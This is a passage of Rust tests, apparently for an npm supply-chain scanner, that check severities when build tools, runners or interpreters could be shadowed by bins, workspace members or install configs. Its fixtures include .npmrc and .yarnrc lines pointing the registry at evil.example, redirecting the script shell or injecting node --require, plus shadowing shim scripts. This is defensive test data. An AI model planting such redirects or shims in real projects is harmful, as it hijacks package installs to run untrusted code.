            r#""typescript": "^5""#,
        ),
        // A dependency (`build-helper`) is declared, but it is not the tool the
        // script names: a `build-helper` that ships a `tsc` bin would shadow
        // the real compiler, and the manifest never pinned `typescript`.
        (r#""prepare": "tsc""#, r#""build-helper": "^1.0.0""#),
    ] {
        let manifest = format!(
            "{{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {{\n    {scripts}\n  }},\n  \"devDependencies\": {{ {deps} }}\n}}\n"
        );
        let r = scan(&[
            ("package.json", &manifest),
            ("dist/index.js", "console.log(1)\n"),
        ]);
        let found = rules(&r);
        assert!(
            found
                .iter()
                .any(|(id, s)| id == "INSTALL-004" && *s == Severity::Medium),
            "{scripts} / [{deps}]: INSTALL-004 must stay Medium: {found:?}"
        );
        assert!(
            !found.iter().any(|(id, _)| id == "INSTALL-012"),
            "{scripts} / [{deps}]: must not become INSTALL-012: {found:?}"
        );
    }

    // Declaring the tool as a registry dependency restores the build-step
    // classification: this is the only difference from the cases above.
    let declared = "{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"prepare\": \"tsc\"\n  },\n  \"devDependencies\": { \"typescript\": \"^5\" }\n}\n";
    let r = scan(&[("package.json", declared), ("dist/index.js", "1\n")]);
    assert!(
        r.findings
            .iter()
            .any(|f| f.rule == "INSTALL-012" && f.severity == Severity::Low),
        "declared typescript should classify as INSTALL-012: {:?}",
        rules(&r)
    );
}

/// A command a lifecycle script runs by name resolves through
/// `node_modules/.bin` first, and npm/yarn/pnpm hoist workspace members' bins
/// there. A member (or the manifest itself) shipping a `bin` named like the
/// build tool, the `node` interpreter, or the `only-allow` guard would run in
/// its place, so the classifier must not trust the script: it keeps the pack's
/// original severity (INSTALL-003 Critical, INSTALL-004 Medium), matching main.
#[test]
fn a_shadowing_bin_keeps_the_original_severity() {
    // A workspace member shipping a bin named like the build tool: INSTALL-004
    // stays Medium, not INSTALL-012 Low.
    let ws = |member_bin: &str| {
        vec![
            (
                "package.json",
                "{\n  \"name\": \"root\",\n  \"version\": \"1.0.0\",\n  \"workspaces\": [\"packages/*\"],\n  \"scripts\": { \"prepare\": \"tsc\" },\n  \"devDependencies\": { \"typescript\": \"^5\" }\n}\n".to_string(),
            ),
            ("dist/index.js", "console.log(1)\n".to_string()),
            (
                "packages/h/package.json",
                format!("{{\n  \"name\": \"h\",\n  \"version\": \"1.0.0\",\n  \"bin\": {member_bin}\n}}\n"),
            ),
            ("packages/h/cli.js", "1\n".to_string()),
        ]
    };
    for member_bin in [
        r#"{ "tsc": "./cli.js" }"#, // object key equals the tool
        r#""./cli.js""#,            // string bin: name is "h" (no clash)
    ] {
        let entries: Vec<(&str, String)> = ws(member_bin);
        let r = scan_owned(&entries);
        let found = rules(&r);
        if member_bin.contains("tsc") {
            assert!(
                found
                    .iter()
                    .any(|(id, s)| id == "INSTALL-004" && *s == Severity::Medium),
                "workspace member bin {member_bin} must keep INSTALL-004 Medium: {found:?}"
            );
            assert!(
                !found.iter().any(|(id, _)| id == "INSTALL-012"),
                "workspace member bin {member_bin} must not become INSTALL-012: {found:?}"
            );
        } else {
            // The member's bin defaults to its own name ("h"), which does not
            // clash with `tsc`, so the build step is still trusted.
            assert!(
                found.iter().any(|(id, _)| id == "INSTALL-012"),
                "non-clashing member bin should still classify: {found:?}"
            );
        }
    }

    // A workspace member bin whose string form defaults to a clashing name.
    let member_named_tsc = vec![
        (
            "package.json",
            "{\n  \"name\": \"root\",\n  \"version\": \"1.0.0\",\n  \"workspaces\": [\"packages/*\"],\n  \"scripts\": { \"prepare\": \"tsc\" },\n  \"devDependencies\": { \"typescript\": \"^5\" }\n}\n".to_string(),
        ),
        ("dist/index.js", "console.log(1)\n".to_string()),
        (
            "packages/tsc/package.json",
            "{\n  \"name\": \"tsc\",\n  \"version\": \"1.0.0\",\n  \"bin\": \"./cli.js\"\n}\n".to_string(),
        ),
        ("packages/tsc/cli.js", "1\n".to_string()),
    ];
    let r = scan_owned(&member_named_tsc);
    assert!(
        rules(&r)
            .iter()
            .any(|(id, s)| id == "INSTALL-004" && *s == Severity::Medium)
            && !rules(&r).iter().any(|(id, _)| id == "INSTALL-012"),
        "a member package named tsc with a string bin shadows tsc: {:?}",
        rules(&r)
    );

    // A workspace member shadowing the shell command `chmod` (a build leaf that
    // needs no declared dependency): INSTALL-004 stays Medium.
    let ws_chmod = vec![
        (
            "package.json",
            "{\n  \"name\": \"root\",\n  \"version\": \"1.0.0\",\n  \"workspaces\": [\"packages/*\"],\n  \"scripts\": { \"prepare\": \"chmod +x dist/index.js\" }\n}\n".to_string(),
        ),
        ("dist/index.js", "console.log(1)\n".to_string()),
        (
            "packages/h/package.json",
            "{\n  \"name\": \"h\",\n  \"version\": \"1.0.0\",\n  \"bin\": { \"chmod\": \"./cli.js\" }\n}\n".to_string(),
        ),
        ("packages/h/cli.js", "1\n".to_string()),
    ];
    let r = scan_owned(&ws_chmod);
    assert!(
        rules(&r)
            .iter()
            .any(|(id, s)| id == "INSTALL-004" && *s == Severity::Medium)
            && !rules(&r).iter().any(|(id, _)| id == "INSTALL-012"),
        "a member bin named chmod shadows the build leaf: {:?}",
        rules(&r)
    );

    // A workspace/own bin named `node` shadows the interpreter that runs an
    // otherwise-inert postinstall: INSTALL-003 stays Critical.
    let ws_node = vec![
        (
            "package.json",
            "{\n  \"name\": \"root\",\n  \"version\": \"1.0.0\",\n  \"workspaces\": [\"packages/*\"],\n  \"scripts\": { \"postinstall\": \"node scripts/probe.js\" }\n}\n".to_string(),
        ),
        ("scripts/probe.js", "console.log(process.platform)\n".to_string()),
        (
            "packages/h/package.json",
            "{\n  \"name\": \"h\",\n  \"version\": \"1.0.0\",\n  \"bin\": { \"node\": \"./cli.js\" }\n}\n".to_string(),
        ),
        ("packages/h/cli.js", "1\n".to_string()),
    ];
    let r = scan_owned(&ws_node);
    assert!(
        rules(&r)
            .iter()
            .any(|(id, s)| id == "INSTALL-003" && *s == Severity::Critical),
        "a member bin named node shadows the interpreter: {:?}",
        rules(&r)
    );
    let own_node = vec![(
        "package.json",
        "{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"bin\": { \"node\": \"./cli.js\" },\n  \"scripts\": { \"postinstall\": \"node scripts/probe.js\" }\n}\n".to_string(),
    ), ("scripts/probe.js", "console.log(1)\n".to_string()), ("cli.js", "1\n".to_string())];
    let r = scan_owned(&own_node);
    assert!(
        rules(&r)
            .iter()
            .any(|(id, s)| id == "INSTALL-003" && *s == Severity::Critical),
        "the manifest's own bin named node shadows the interpreter: {:?}",
        rules(&r)
    );

    // A workspace member bin named `only-allow` shadows what npx runs:
    // INSTALL-003 stays Critical.
    let ws_only = vec![
        (
            "package.json",
            "{\n  \"name\": \"root\",\n  \"version\": \"1.0.0\",\n  \"workspaces\": [\"packages/*\"],\n  \"scripts\": { \"preinstall\": \"npx only-allow pnpm\" }\n}\n".to_string(),
        ),
        (
            "packages/h/package.json",
            "{\n  \"name\": \"h\",\n  \"version\": \"1.0.0\",\n  \"bin\": { \"only-allow\": \"./cli.js\" }\n}\n".to_string(),
        ),
        ("packages/h/cli.js", "1\n".to_string()),
    ];
    let r = scan_owned(&ws_only);
    assert!(
        rules(&r)
            .iter()
            .any(|(id, s)| id == "INSTALL-003" && *s == Severity::Critical),
        "a member bin named only-allow shadows what npx runs: {:?}",
        rules(&r)
    );

    // pnpm workspaces are declared in pnpm-workspace.yaml, not package.json,
    // but hoist bins the same way.
    let pnpm_ws = vec![
        (
            "package.json",
            "{\n  \"name\": \"root\",\n  \"version\": \"1.0.0\",\n  \"scripts\": { \"prepare\": \"tsc\" },\n  \"devDependencies\": { \"typescript\": \"^5\" }\n}\n".to_string(),
        ),
        ("pnpm-workspace.yaml", "packages:\n  - packages/*\n".to_string()),
        ("dist/index.js", "console.log(1)\n".to_string()),
        (
            "packages/h/package.json",
            "{\n  \"name\": \"h\",\n  \"version\": \"1.0.0\",\n  \"bin\": { \"tsc\": \"./cli.js\" }\n}\n".to_string(),
        ),
        ("packages/h/cli.js", "1\n".to_string()),
    ];
    let r = scan_owned(&pnpm_ws);
    assert!(
        rules(&r)
            .iter()
            .any(|(id, s)| id == "INSTALL-004" && *s == Severity::Medium)
            && !rules(&r).iter().any(|(id, _)| id == "INSTALL-012"),
        "a pnpm-workspace member bin shadows tsc: {:?}",
        rules(&r)
    );

    // A non-workspace nested package.json does NOT hoist its bins, so it does
    // not block the rewrite: a single package with a build-only prepare and an
    // unrelated nested example still classifies as INSTALL-012.
    let nested_non_ws = vec![
        (
            "package.json",
            "{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": { \"prepare\": \"tsc\" },\n  \"devDependencies\": { \"typescript\": \"^5\" }\n}\n".to_string(),
        ),
        ("dist/index.js", "console.log(1)\n".to_string()),
        (
            "examples/demo/package.json",
            "{\n  \"name\": \"demo\",\n  \"version\": \"1.0.0\",\n  \"bin\": { \"tsc\": \"./cli.js\" }\n}\n".to_string(),
        ),
        ("examples/demo/cli.js", "1\n".to_string()),
    ];
    let r = scan_owned(&nested_non_ws);
    assert!(
        rules(&r).iter().any(|(id, _)| id == "INSTALL-012"),
        "a nested non-workspace package must not block the rewrite: {:?}",
        rules(&r)
    );
}

// ---------------------------------------------------------------------------
// Runners and dependencies (the two #172 review findings)
// ---------------------------------------------------------------------------

/// `{ "name": "x", "version": "1.0.0", "scripts": { <scripts> }<extra> }`.
fn pkg(scripts: &str, extra: &str) -> String {
    format!(
        "{{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {{ {scripts} }}{extra}\n}}\n"
    )
}

/// `rewritten`: the `prepare` classifies as INSTALL-012 Low; otherwise it
/// keeps INSTALL-004 Medium.
fn assert_prepare(entries: &[(&str, String)], rewritten: bool, what: &str) {
    let r = scan_owned(entries);
    let found = rules(&r);
    let low = found
        .iter()
        .any(|(id, s)| id == "INSTALL-012" && *s == Severity::Low);
    let medium = found
        .iter()
        .any(|(id, s)| id == "INSTALL-004" && *s == Severity::Medium);
    if rewritten {
        assert!(low && !medium, "{what}: expected INSTALL-012: {found:?}");
    } else {
        assert!(
            medium && !low,
            "{what}: INSTALL-004 must stay Medium: {found:?}"
        );
    }
}

/// `rewritten`: the install key classifies as `rule`; otherwise it keeps
/// INSTALL-003 Critical.
fn assert_install_key(entries: &[(&str, String)], rewritten: Option<&str>, what: &str) {
    match rewritten {
        Some(rule) => {
            let r = scan_owned(entries);
            let found = rules(&r);
            assert!(
                found.iter().any(|(id, _)| id == rule)
                    && !found.iter().any(|(id, _)| id == "INSTALL-003"),
                "{what}: expected {rule}: {found:?}"
            );
        }
        None => assert_install003_stays_critical(entries, what),
    }
}

/// Finding 1: `npm run build` runs `npm` by name from the lifecycle PATH
/// before it reaches `build`, and so do `pnpm run` and `yarn run`. A bin
/// named like the runner — the package's own, or a workspace member's — runs
/// in its place and the chain it appears to follow never runs: INSTALL-004
/// stays Medium, as it does when a leaf is shadowed.
#[test]
fn a_shadowed_runner_keeps_install004() {
    for runner in ["npm", "pnpm", "yarn"] {
        let scripts = format!(r#""build": "tsc", "prepare": "{runner} run build""#);
        let ts = r#", "devDependencies": { "typescript": "^5" }"#;
        // Control: nothing collides, so the chain is a build step.
        assert_prepare(
            &[("package.json", pkg(&scripts, ts))],
            true,
            &format!("{runner}: no collision"),
        );
        // The manifest's own object bin named like the runner.
        let own = pkg(
            &scripts,
            &format!(r#", "bin": {{ "{runner}": "./cli.js" }}{ts}"#),
        );
        assert_prepare(
            &[("package.json", own), ("cli.js", "1\n".to_string())],
            false,
            &format!("own bin {runner}"),
        );
        // A string bin takes the package's own name.
        let named = pkg(&scripts, &format!(r#", "bin": "./cli.js"{ts}"#))
            .replace("\"name\": \"x\"", &format!("\"name\": \"{runner}\""));
        assert_prepare(
            &[("package.json", named), ("cli.js", "1\n".to_string())],
            false,
            &format!("package named {runner} with a string bin"),
        );
        // A workspace member exporting the runner.
        let root = pkg(&scripts, &format!(r#", "workspaces": ["packages/*"]{ts}"#));
        let member = format!(
            "{{\n  \"name\": \"h\",\n  \"version\": \"1.0.0\",\n  \"bin\": {{ \"{runner}\": \"./cli.js\" }}\n}}\n"
        );
        assert_prepare(
            &[
                ("package.json", root.clone()),
                ("packages/h/package.json", member),
                ("packages/h/cli.js", "1\n".to_string()),
            ],
            false,
            &format!("workspace member bin {runner}"),
        );
        // The same workspace with a member that links nothing classifies.
        assert_prepare(
            &[
                ("package.json", root),
                (
                    "packages/h/package.json",
                    "{\n  \"name\": \"h\",\n  \"version\": \"1.0.0\"\n}\n".to_string(),
                ),
            ],
            true,
            &format!("{runner}: workspace member without bins"),
        );
    }
    // A runner reached two hops down is trusted the same way.
    let nested = pkg(
        r#""compile": "tsc", "build": "pnpm run compile", "prepare": "npm run build""#,
        r#", "bin": { "pnpm": "./cli.js" }, "devDependencies": { "typescript": "^5" }"#,
    );
    assert_prepare(
        &[("package.json", nested), ("cli.js", "1\n".to_string())],
        false,
        "own bin pnpm on the second hop",
    );
}

/// Every tool and runner a rewrite trusts is a `#!/usr/bin/env node` script,
/// and npm spawns the script shell by name: an own bin named `node` or `sh`
/// shadows them for every rewrite that runs one.
#[test]
fn an_own_node_or_sh_bin_keeps_the_original_finding() {
    let ts = r#", "devDependencies": { "typescript": "^5" }"#;
    for bin in ["node", "sh"] {
        let extra = format!(r#", "bin": {{ "{bin}": "./cli.js" }}"#);
        assert_prepare(
            &[
                (
                    "package.json",
                    pkg(r#""prepare": "tsc""#, &format!("{extra}{ts}")),
                ),
                ("cli.js", "1\n".to_string()),
            ],
            false,
            &format!("prepare tsc with an own {bin} bin"),
        );
        assert_install_key(
            &[
                (
                    "package.json",
                    pkg(r#""preinstall": "npx only-allow pnpm""#, &extra),
                ),
                ("cli.js", "1\n".to_string()),
            ],
            None,
            &format!("only-allow with an own {bin} bin"),
        );
    }
    // `sh` runs every step, `true` and `exit 0` included.
    assert_prepare(
        &[
            (
                "package.json",
                pkg(r#""prepare": "exit 0""#, r#", "bin": { "sh": "./cli.js" }"#),
            ),
            ("cli.js", "1\n".to_string()),
        ],
        false,
        "exit 0 with an own sh bin",
    );
    // Control: `chmod +x` alone runs no node script, so an own `node` bin
    // does not collide with it.
    assert_prepare(
        &[
            (
                "package.json",
                pkg(
                    r#""prepare": "chmod +x dist/index.js""#,
                    r#", "bin": { "node": "./cli.js" }"#,
                ),
            ),
            ("cli.js", "1\n".to_string()),
            ("dist/index.js", "console.log(1)\n".to_string()),
        ],
        true,
        "chmod with an own node bin",
    );
}

/// Finding 2, the guard: any package the install adds could link an
/// `only-allow`, `npx` or `node` bin, and this pass cannot see a dependency's
/// bins, so `npx only-allow` with any dependency stays INSTALL-003 Critical.
#[test]
fn only_allow_with_any_dependency_stays_critical() {
    for key in ["preinstall", "postinstall"] {
        let guard = format!(r#""{key}": "npx only-allow pnpm""#);
        assert_install_key(
            &[("package.json", pkg(&guard, ""))],
            Some("INSTALL-011"),
            &format!("{key}: no dependencies"),
        );
        for extra in [
            r#", "dependencies": { "left-pad": "^1.3.0" }"#,
            r#", "dependencies": { "@modelcontextprotocol/sdk": "^1.0.0", "zod": "^3.23.0" }"#,
            r#", "optionalDependencies": { "fsevents": "^2.3.3" }"#,
            r#", "peerDependencies": { "react": ">=18" }"#,
            r#", "bundleDependencies": ["left-pad"]"#,
            r#", "bundledDependencies": ["left-pad"]"#,
            r#", "bundleDependencies": true"#,
            r#", "dependencies": { "npm": "^10.0.0" }"#,
            r#", "dependencies": { "helper": "github:x/helper" }"#,
            // Fields this pass cannot read are not an empty set.
            r#", "dependencies": ["left-pad"]"#,
            r#", "dependencies": "left-pad""#,
            r#", "dependencies": null"#,
            r#", "optionalDependencies": { "fsevents": 2 }"#,
        ] {
            assert_install_key(
                &[("package.json", pkg(&guard, extra))],
                None,
                &format!("{key}{extra}"),
            );
        }
    }
    // An empty field installs nothing.
    assert_install_key(
        &[(
            "package.json",
            pkg(
                r#""preinstall": "npx only-allow pnpm""#,
                r#", "dependencies": {}, "bundleDependencies": []"#,
            ),
        )],
        Some("INSTALL-011"),
        "empty dependency fields",
    );
}

/// Finding 2, the inert script: a dependency could link a `node` bin (the
/// `node` package on npm does exactly that), so `node inert.js` with any
/// dependency stays INSTALL-003 Critical.
#[test]
fn an_inert_postinstall_with_any_dependency_stays_critical() {
    for extra in [
        r#""dependencies": { "left-pad": "^1.3.0" }"#,
        r#""dependencies": { "node": "^20.0.0" }"#,
        r#""optionalDependencies": { "@acme/tool-mcp-linux-x64": "1.4.0" }"#,
        r#""peerDependencies": { "typescript": "^5" }"#,
        r#""bundleDependencies": ["left-pad"]"#,
    ] {
        let manifest = INERT_MANIFEST.replace(
            "  \"scripts\": {",
            &format!("  {extra},\n  \"scripts\": {{"),
        );
        assert!(manifest.contains(extra), "fixture drifted: {extra}");
        let entries = with(inert_shape(), "package/package.json", &manifest);
        assert_install003_stays_critical(&entries, extra);
    }
}

/// Finding 2, the build chain: `prepare` runs after devDependencies are
/// installed too, so any package beyond the tools' own (`typescript` for
/// `tsc`, `husky`, `shx`, `rimraf`; none for `chmod`, `true`, `exit 0`) keeps
/// INSTALL-004 Medium. A lockfile saying the extra package links no such
/// bin is not evidence: npm links bins from the installed package's own
/// manifest, and the lockfile's `bin` metadata is text the author wrote.
#[test]
fn a_build_step_beside_any_other_dependency_stays_medium() {
    let files = |manifest: String| {
        vec![
            ("package.json", manifest),
            ("dist/index.js", "console.log(1)\n".to_string()),
        ]
    };
    for (scripts, fields) in [
        (
            r#""prepare": "tsc""#,
            r#", "devDependencies": { "typescript": "^5", "@types/node": "^22" }"#,
        ),
        (
            r#""prepare": "tsc""#,
            r#", "dependencies": { "zod": "^3" }, "devDependencies": { "typescript": "^5" }"#,
        ),
        (
            r#""prepare": "tsc""#,
            r#", "optionalDependencies": { "fsevents": "^2" }, "devDependencies": { "typescript": "^5" }"#,
        ),
        (
            r#""prepare": "tsc""#,
            r#", "peerDependencies": { "react": ">=18" }, "devDependencies": { "typescript": "^5" }"#,
        ),
        (
            r#""prepare": "tsc""#,
            r#", "devDependencies": { "typescript": "^5", "husky": "^9" }"#,
        ),
        (
            r#""prepare": "husky""#,
            r#", "devDependencies": { "husky": "^9", "lint-staged": "^15" }"#,
        ),
        (
            r#""build": "tsc && shx chmod +x dist/*.js", "prepare": "npm run build""#,
            r#", "devDependencies": { "typescript": "^5", "shx": "^0.4", "eslint": "^9" }"#,
        ),
        (
            r#""prepare": "chmod +x dist/index.js""#,
            r#", "dependencies": { "left-pad": "^1.3.0" }"#,
        ),
        (
            r#""prepare": "exit 0""#,
            r#", "devDependencies": { "left-pad": "^1.3.0" }"#,
        ),
        (
            r#""prepare": "tsc""#,
            r#", "devDependencies": { "typescript": "^5" }, "dependencies": ["zod"]"#,
        ),
    ] {
        assert_prepare(
            &files(pkg(scripts, fields)),
            false,
            &format!("{scripts} {fields}"),
        );
    }
    // A lockfile claiming the extra package links no bin changes nothing.
    let lock = r#"{"lockfileVersion":3,"packages":{"":{"devDependencies":{"typescript":"^5","helper":"^1.0.0"}},"node_modules/typescript":{"version":"5.9.3","resolved":"https://registry.npmjs.org/typescript/-/typescript-5.9.3.tgz","bin":{"tsc":"bin/tsc","tsserver":"bin/tsserver"}},"node_modules/helper":{"version":"1.0.0","resolved":"https://registry.npmjs.org/helper/-/helper-1.0.0.tgz"}}}"#;
    let mut entries = files(pkg(
        r#""prepare": "tsc""#,
        r#", "devDependencies": { "typescript": "^5", "helper": "^1.0.0" }"#,
    ));
    entries.push(("package-lock.json", lock.to_string()));
    assert_prepare(&entries, false, "lockfile says helper has no bin");
    // Zero other dependencies: each tool with exactly its own package.
    for (scripts, fields) in [
        (
            r#""prepare": "tsc""#,
            r#", "devDependencies": { "typescript": "^5" }"#,
        ),
        (
            r#""prepare": "tsc""#,
            r#", "dependencies": { "typescript": "^5" }"#,
        ),
        (r#""prepare": "chmod +x dist/index.js""#, ""),
        (r#""prepare": "exit 0""#, ""),
        (
            r#""clean": "rimraf dist", "build": "npm run clean && tsc", "prepare": "npm run build""#,
            r#", "devDependencies": { "typescript": "^5", "rimraf": "^6" }"#,
        ),
    ] {
        assert_prepare(
            &files(pkg(scripts, fields)),
            true,
            &format!("{scripts} {fields}"),
        );
    }
}

/// At a workspace root the install adds every member and every member's
/// dependencies, and a member's own scripts run with the root's
/// `node_modules/.bin` on PATH: the dependency rule covers the whole
/// workspace in both directions.
#[test]
fn a_workspace_counts_every_members_dependencies() {
    let member =
        |extra: &str| format!("{{\n  \"name\": \"h\",\n  \"version\": \"1.0.0\"{extra}\n}}\n");
    let root = |scripts: &str, extra: &str| {
        pkg(
            scripts,
            &format!(r#", "workspaces": ["packages/*"]{extra}"#),
        )
    };
    let ts = r#", "devDependencies": { "typescript": "^5" }"#;
    let dep = r#", "dependencies": { "left-pad": "^1.3.0" }"#;

    // The root's prepare, a member with a dependency.
    for (m, rewritten) in [(member(""), true), (member(dep), false)] {
        assert_prepare(
            &[
                ("package.json", root(r#""prepare": "tsc""#, ts)),
                ("packages/h/package.json", m.clone()),
            ],
            rewritten,
            &format!("root prepare, member {m}"),
        );
        // The root's guard and inert postinstall: install-phase fields.
        assert_install_key(
            &[
                (
                    "package.json",
                    root(r#""preinstall": "npx only-allow pnpm""#, ""),
                ),
                ("packages/h/package.json", m.clone()),
            ],
            rewritten.then_some("INSTALL-011"),
            &format!("root guard, member {m}"),
        );
        assert_install_key(
            &[
                (
                    "package.json",
                    root(r#""postinstall": "node scripts/probe.js""#, ""),
                ),
                (
                    "scripts/probe.js",
                    "console.log(process.platform)\n".to_string(),
                ),
                ("packages/h/package.json", m.clone()),
            ],
            rewritten.then_some("INSTALL-010"),
            &format!("root inert postinstall, member {m}"),
        );
    }
    // A member's devDependency is installed for the root's prepare.
    assert_prepare(
        &[
            ("package.json", root(r#""prepare": "tsc""#, ts)),
            (
                "packages/h/package.json",
                member(r#", "devDependencies": { "vitest": "^2" }"#),
            ),
        ],
        false,
        "member devDependency, root prepare",
    );
    // A member whose manifest this pass cannot read could declare anything.
    assert_prepare(
        &[
            ("package.json", root(r#""prepare": "tsc""#, ts)),
            (
                "packages/h/package.json",
                "{ \"name\": \"h\", \n".to_string(),
            ),
        ],
        false,
        "unreadable member manifest",
    );
    // A member's own prepare sees the root's packages: the root, or a
    // sibling, with a dependency keeps it Medium.
    let member_prepare = pkg(r#""prepare": "tsc""#, ts).replace("\"x\"", "\"a\"");
    for (root_extra, sibling, rewritten) in [
        ("", member(""), true),
        (dep, member(""), false),
        ("", member(dep), false),
    ] {
        assert_prepare(
            &[
                ("package.json", root(r#""test": "true""#, root_extra)),
                ("packages/a/package.json", member_prepare.clone()),
                ("packages/h/package.json", sibling.clone()),
            ],
            rewritten,
            &format!("member prepare, root [{root_extra}], sibling {sibling}"),
        );
    }
    // pnpm declares the workspace in pnpm-workspace.yaml.
    assert_prepare(
        &[
            ("package.json", pkg(r#""test": "true""#, dep)),
            (
                "pnpm-workspace.yaml",
                "packages:\n  - packages/*\n".to_string(),
            ),
            ("packages/a/package.json", member_prepare.clone()),
        ],
        false,
        "pnpm workspace root with a dependency, member prepare",
    );
}

/// npm puts the `node_modules/.bin` of every directory above the package on
/// PATH too, so a `node_modules` shipped above it keeps the finding.
#[test]
fn a_node_modules_above_the_package_keeps_the_original_finding() {
    let manifest = pkg(
        r#""prepare": "tsc""#,
        r#", "devDependencies": { "typescript": "^5" }"#,
    );
    assert_prepare(
        &[("package/package.json", manifest.clone())],
        true,
        "control: nothing above the package",
    );
    assert_prepare(
        &[
            ("package/package.json", manifest),
            (
                "node_modules/.bin/tsc",
                "#!/bin/sh\necho build\n".to_string(),
            ),
        ],
        false,
        "node_modules/.bin above the package",
    );
}

/// npm links *every* file in a `directories.bin` directory as a
/// `node_modules/.bin` entry, and this pass cannot enumerate them, so a
/// manifest (or a workspace member) that uses `directories.bin` could ship a
/// file named like any trusted tool, runner or interpreter: the rewrite fails
/// closed. `directories` without a `bin` key, or `directories.bin: null`, does
/// not.
#[test]
fn a_directories_bin_manifest_keeps_the_original_finding() {
    let ts = r#", "devDependencies": { "typescript": "^5" }"#;
    // prepare -> INSTALL-012, guard -> INSTALL-011, inert -> INSTALL-010.
    let dirbin = r#", "directories": { "bin": "./b" }"#;
    assert_prepare(
        &[(
            "package.json",
            pkg(r#""prepare": "tsc""#, &format!("{dirbin}{ts}")),
        )],
        false,
        "prepare tsc with directories.bin",
    );
    // Even with the shipped file actually named like the runner.
    assert_prepare(
        &[
            (
                "package.json",
                pkg(
                    r#""build": "tsc", "prepare": "npm run build""#,
                    &format!("{dirbin}{ts}"),
                ),
            ),
            ("b/npm", "#!/bin/sh\nid\n".to_string()),
        ],
        false,
        "npm run build with a directories.bin/npm",
    );
    assert_install_key(
        &[(
            "package.json",
            pkg(r#""preinstall": "npx only-allow pnpm""#, dirbin),
        )],
        None,
        "only-allow with directories.bin",
    );
    assert_install_key(
        &[
            (
                "package.json",
                pkg(r#""postinstall": "node ./s.js""#, dirbin),
            ),
            ("s.js", "console.log(process.platform)\n".to_string()),
        ],
        None,
        "inert postinstall with directories.bin",
    );
    // A workspace member's directories.bin is hoisted to the root's PATH.
    assert_prepare(
        &[
            (
                "package.json",
                pkg(
                    r#""build": "tsc", "prepare": "npm run build""#,
                    &format!(r#", "workspaces": ["packages/*"]{ts}"#),
                ),
            ),
            (
                "packages/h/package.json",
                "{\n  \"name\": \"h\",\n  \"version\": \"1.0.0\",\n  \"directories\": { \"bin\": \"./b\" }\n}\n"
                    .to_string(),
            ),
        ],
        false,
        "workspace member directories.bin",
    );
    // Controls: another `directories` key, or an explicit null, still rewrite.
    assert_prepare(
        &[(
            "package.json",
            pkg(
                r#""prepare": "tsc""#,
                &format!(r#", "directories": {{ "lib": "src" }}{ts}"#),
            ),
        )],
        true,
        "directories.lib only",
    );
    assert_prepare(
        &[(
            "package.json",
            pkg(
                r#""prepare": "tsc""#,
                &format!(r#", "directories": {{ "bin": null }}{ts}"#),
            ),
        )],
        true,
        "directories.bin: null",
    );
}

/// npm, yarn and pnpm read a package-manager config file from the install
/// directory upward before a script line runs. One that redirects the script
/// shell, `node`, the config file itself or the registry, or that runs a hook
/// or a different binary as the package manager, keeps the original finding. A
/// config with only benign keys does not.
#[test]
fn an_install_config_that_alters_execution_keeps_the_original_finding() {
    let ts = r#", "devDependencies": { "typescript": "^5" }"#;
    let prepare = || pkg(r#""prepare": "tsc""#, ts);
    // Each of these config files makes the prepare keep INSTALL-004 Medium.
    let dangerous: &[(&str, &str)] = &[
        (".npmrc", "script-shell=./e.js\n"),
        (".npmrc", "shell=/tmp/e\n"),
        (".npmrc", "node-options=--require ./e.js\n"),
        (".npmrc", "globalconfig=./other-npmrc\n"),
        (".npmrc", "userconfig=./other-npmrc\n"),
        (".npmrc", "registry=https://evil.example/\n"),
        (".npmrc", "@acme:registry=https://evil.example/\n"),
        (
            ".pnpmfile.cjs",
            "module.exports={hooks:{readPackage:p=>p}}\n",
        ),
        (".yarnrc", "yarn-path \"./e.js\"\n"),
        (".yarnrc", "registry \"https://evil.example/\"\n"),
        (".yarnrc.yml", "yarnPath: ./.yarn/releases/e.cjs\n"),
        (".yarnrc.yml", "plugins:\n  - path: ./p.cjs\n"),
        (".yarnrc.yml", "npmRegistryServer: https://evil.example/\n"),
    ];
    for (name, body) in dangerous {
        assert_prepare(
            &[("package.json", prepare()), (name, body.to_string())],
            false,
            &format!("{name}: {}", body.trim()),
        );
    }
    // The guard and the inert postinstall fail closed the same way.
    assert_install_key(
        &[
            (
                "package.json",
                pkg(r#""preinstall": "npx only-allow pnpm""#, ""),
            ),
            (".npmrc", "script-shell=./e.js\n".to_string()),
        ],
        None,
        "only-allow with .npmrc script-shell",
    );
    assert_install_key(
        &[
            ("package.json", pkg(r#""postinstall": "node ./s.js""#, "")),
            ("s.js", "console.log(process.platform)\n".to_string()),
            (".npmrc", "registry=http://evil.example/\n".to_string()),
        ],
        None,
        "inert postinstall with an off-registry .npmrc",
    );
    // A config file in a directory above the package still applies.
    assert_prepare(
        &[
            ("pkg/package.json", prepare()),
            (".npmrc", "script-shell=./e.js\n".to_string()),
        ],
        false,
        ".npmrc in an ancestor directory",
    );
    // Controls: a benign config with only harmless keys still rewrites.
    for (name, body) in [
        (
            ".npmrc",
            "save-exact=true\nengine-strict=true\nregistry=https://registry.npmjs.org/\n",
        ),
        (".yarnrc.yml", "nodeLinker: node-modules\n"),
        (".yarnrc", "save-prefix \"~\"\n"),
    ] {
        assert_prepare(
            &[("package.json", prepare()), (name, body.to_string())],
            true,
            &format!("benign {name}"),
        );
    }
}

// ---------------------------------------------------------------------------
// Overrides, package extensions and lockfiles below a trusted tool
// (Codex review of #172, finding B)
// ---------------------------------------------------------------------------

/// The Codex shape: `prepare: "rimraf dist"` with `rimraf` a registry
/// devDependency, which INSTALL-012 would rewrite to Low.
const RIMRAF_PREPARE: &str = r#""prepare": "rimraf dist""#;
const RIMRAF_DEV: &str = r#", "devDependencies": { "rimraf": "^5.0.0" }"#;

fn rimraf_prepare(extra: &str) -> String {
    pkg(RIMRAF_PREPARE, &format!("{RIMRAF_DEV}{extra}"))
}

/// A registry-only npm lockfile for rimraf and one of its dependencies.
